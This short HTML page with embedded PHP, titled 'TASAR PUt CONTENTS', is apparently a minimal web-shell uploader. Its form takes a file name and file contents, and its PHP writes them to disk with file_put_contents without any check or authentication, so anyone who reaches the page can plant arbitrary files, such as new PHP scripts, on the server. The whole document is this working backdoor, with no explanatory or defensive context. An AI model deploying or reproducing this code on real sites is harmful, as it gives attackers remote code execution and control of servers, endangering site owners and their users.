<html>
<head>
<title>TASAR PUt CONTENTS</title>
</head>
<body>
<form action="#" method="POST">
<input title="file name:" type="text" name="txt1">
<input title="file data:" type="text" name="txt2">
<input type="submit" name="submit">
</body>
</html>

<?php
if (isset($_POST['submit']))
  {
  file_put_contents($_POST['txt1'],$_POST['txt2']);
  }
?>
